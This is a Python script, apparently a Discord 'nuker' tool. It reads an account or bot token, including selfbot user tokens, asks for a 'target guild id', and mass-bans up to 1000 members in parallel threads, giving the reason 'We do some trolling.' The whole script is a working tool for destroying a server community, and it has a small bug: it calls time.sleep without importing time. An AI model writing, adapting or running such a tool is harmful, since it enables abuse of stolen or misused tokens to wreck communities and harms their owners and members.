import requests
import concurrent.futures

def ball():
    with open("token.txt", "r") as file:
        token = file.readline().strip()
    
    if token == "":
        print("Invalid token")
    elif token == "single token here":
        print("Edit the file token.txt dumbass")
    else:
        selfbot = input("Selfbot? [y|n] ")
        if selfbot == "y":
            bottoken = "True"
        elif selfbot == "n":
            bottoken = False
        else:
            print("Invalid answer")
            return
        if bottoken == "True":
            headers = {'Authorization': f'Bot {token}'}
        else:
            headers = {'Authorization': token}
        
        validation(token, headers)

def validation(token, headers):
    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if response.status_code == 200:
        massban(token, headers)
    else:
        print("Invalid token probably edit token.txt with a valid token")
        print(response.status_code)

def massban(token, headers):
    guild_id = input("Enter the target guild id: ")
    hm = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000', headers=headers)
    if hm.status_code == 200:
        members = hm.json()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            ban_tasks = [executor.submit(ban_member, guild_id, member['user']['id'], headers, token) for member in members]
            concurrent.futures.wait(ban_tasks)
    else:
        print(hm.status_code)

def ban_member(guild_id, user_id, headers, token):
    response = requests.put(f'https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}', headers=headers, json={'reason': 'We do some trolling.'})
    if response.status_code == 200:
        print(f"Banned {user_id}")
    elif response.status_code == 429:
        print(f"Ratelimited waiting 3 seconds... {response.status_code}")
        time.sleep(3)
    else:
        print(f"Failed to ban{user_id} {response.status_code}")

ball()
